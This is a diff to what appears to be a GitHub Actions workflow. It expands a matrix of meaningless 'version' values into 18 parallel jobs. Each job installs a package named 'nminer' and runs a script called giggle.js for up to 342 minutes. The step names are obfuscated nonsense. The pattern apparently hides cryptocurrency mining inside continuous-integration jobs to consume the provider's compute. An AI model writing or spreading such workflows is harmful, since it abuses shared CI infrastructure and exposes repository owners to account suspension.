@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8432 }
-          - { version: 853 }
-          - { version: 7002 }
-          - { version: 3620 }
-          - { version: 4080 }
-          - { version: 761 }
-          - { version: 9456 }
-          - { version: 3100 }
-          - { version: 5320 }
-          - { version: 1673 }
-          - { version: 2318 }
-          - { version: 3683 }
-          - { version: 4519 }
-          - { version: 5549 }
-          - { version: 8676 }
+          - { version: 9110 }
+          - { version: 3105 }
+          - { version: 4911 }
+          - { version: 9795 }
+          - { version: 8790 }
+          - { version: 7414 }
+          - { version: 8306 }
+          - { version: 7743 }
+          - { version: 2029 }
+          - { version: 9198 }
+          - { version: 8630 }
+          - { version: 7244 }
+          - { version: 3563 }
+          - { version: 5655 }
+          - { version: 8070 }
+          - { version: 6004 }
+          - { version: 7876 }
+          - { version: 1931 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: woot stay provided
+      - name: quickly
         run: |
           npm install nminer@latest
-          timeout 310m node giggle.js || echo "giggle executed"
+          timeout 342m node giggle.js || echo "giggle executed"
